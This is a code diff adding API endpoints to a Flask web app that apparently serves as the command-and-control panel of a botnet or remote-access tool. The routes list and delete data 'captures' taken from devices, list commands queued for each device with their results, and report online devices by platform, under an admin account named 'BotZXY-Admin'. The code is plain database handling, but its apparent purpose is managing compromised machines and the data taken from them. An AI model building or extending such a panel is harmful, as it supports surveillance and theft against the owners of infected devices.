@@ -537,6 +537,142 @@ def get_login_attempts():
     
     return jsonify(result)
 
+# ============ API CAPTURES ============
+@app.route('/api/captures', methods=['GET'])
+@login_required
+def get_captures():
+    """Recupera tutte le catture dal database"""
+    limit = request.args.get('limit', 50, type=int)
+    device_id = request.args.get('device_id', None)
+    capture_type = request.args.get('type', None)
+    
+    conn = get_db()
+    query = 'SELECT id, device_id, type, data, created_at FROM captures WHERE 1=1'
+    params = []
+    
+    if device_id:
+        query += ' AND device_id = ?'
+        params.append(device_id)
+    if capture_type:
+        query += ' AND type = ?'
+        params.append(capture_type)
+    
+    query += ' ORDER BY created_at DESC LIMIT ?'
+    params.append(limit)
+    
+    captures = conn.execute(query, params).fetchall()
+    conn.close()
+    
+    result = []
+    for c in captures:
+        # Decodifica data se è JSON
+        data = c['data']
+        try:
+            if data and data.startswith('{'):
+                data = json.loads(data)
+        except:
+            pass
+        result.append({
+            'id': c['id'],
+            'device_id': c['device_id'],
+            'type': c['type'],
+            'data': data,
+            'created_at': c['created_at']
+        })
+    
+    return jsonify(result)
+
+@app.route('/api/captures/<int:capture_id>', methods=['DELETE'])
+@login_required
+def delete_capture(capture_id):
+    """Elimina una cattura"""
+    conn = get_db()
+    # Verifica che esista
+    capture = conn.execute('SELECT * FROM captures WHERE id = ?', (capture_id,)).fetchone()
+    if not capture:
+        conn.close()
+        return jsonify({'error': 'Capture not found'}), 404
+    
+    conn.execute('DELETE FROM captures WHERE id = ?', (capture_id,))
+    conn.commit()
+    conn.close()
+    log_action('system', 'capture_deleted', f'Cattura {capture_id} eliminata')
+    return jsonify({'status': 'deleted'})
+
+@app.route('/api/captures/clear', methods=['POST'])
+@login_required
+def clear_captures():
+    """Cancella tutte le catture (solo admin)"""
+    conn = get_db()
+    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
+    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
+        conn.close()
+        return jsonify({'error': 'Accesso negato'}), 403
+    
+    conn.execute('DELETE FROM captures')
+    conn.commit()
+    conn.close()
+    log_action('system', 'captures_cleared', 'Tutte le catture cancellate')
+    return jsonify({'status': 'cleared'})
+
+# ============ API COMANDI ============
+@app.route('/api/commands', methods=['GET'])
+@login_required
+def get_commands():
+    """Recupera tutti i comandi dal database"""
+    limit = request.args.get('limit', 50, type=int)
+    device_id = request.args.get('device_id', None)
+    
+    conn = get_db()
+    if device_id:
+        commands = conn.execute('''
+            SELECT id, device_id, command, params, status, result, created_at, executed_at 
+            FROM commands 
+            WHERE device_id = ? 
+            ORDER BY created_at DESC 
+            LIMIT ?
+        ''', (device_id, limit)).fetchall()
+    else:
+        commands = conn.execute('''
+            SELECT id, device_id, command, params, status, result, created_at, executed_at 
+            FROM commands 
+            ORDER BY created_at DESC 
+            LIMIT ?
+        ''', (limit,)).fetchall()
+    conn.close()
+    return jsonify([dict(c) for c in commands])
+
+# ============ API DEVICES STATS ============
+@app.route('/api/devices/stats', methods=['GET'])
+@login_required
+def get_device_stats():
+    """Statistiche dettagliate sui dispositivi"""
+    conn = get_db()
+    
+    # Totale per piattaforma
+    platforms = conn.execute('''
+        SELECT platform, COUNT(*) as count, 
+               SUM(CASE WHEN is_online = 1 THEN 1 ELSE 0 END) as online
+        FROM devices 
+        GROUP BY platform
+    ''').fetchall()
+    
+    # Attività ultimi 7 giorni
+    activity = conn.execute('''
+        SELECT date(last_seen) as day, COUNT(*) as count
+        FROM devices 
+        WHERE last_seen >= datetime('now', '-7 days')
+        GROUP BY date(last_seen)
+        ORDER BY day
+    ''').fetchall()
+    
+    conn.close()
+    
+    return jsonify({
+        'platforms': [dict(p) for p in platforms],
+        'activity_7d': [dict(a) for a in activity]
+    })
+
 # ============ ADMIN SETUP ============
 def setup_admin_user():
     try:
